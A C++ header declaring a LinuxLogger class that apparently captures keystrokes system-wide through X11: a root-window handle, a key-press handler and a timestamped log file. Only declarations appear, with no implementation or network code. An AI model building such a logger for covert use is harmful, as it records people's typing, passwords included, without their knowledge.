#pragma once

#if defined(__linux__)
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>
#include <fstream>
#include <string>
#include <memory>
#include <ctime>
#include <filesystem>
#include <chrono>

class LinuxLogger
{
public:
    LinuxLogger();
    ~LinuxLogger();
    void startLogging();

private:
    void handleKeyPress(XKeyEvent* event);
    std::string generateLogFilePath() const;

    std::filesystem::path logFilePath;
    std::ofstream logFile;
    Display* display;
    Window rootWindow;
    bool isRunning;
};
#endif
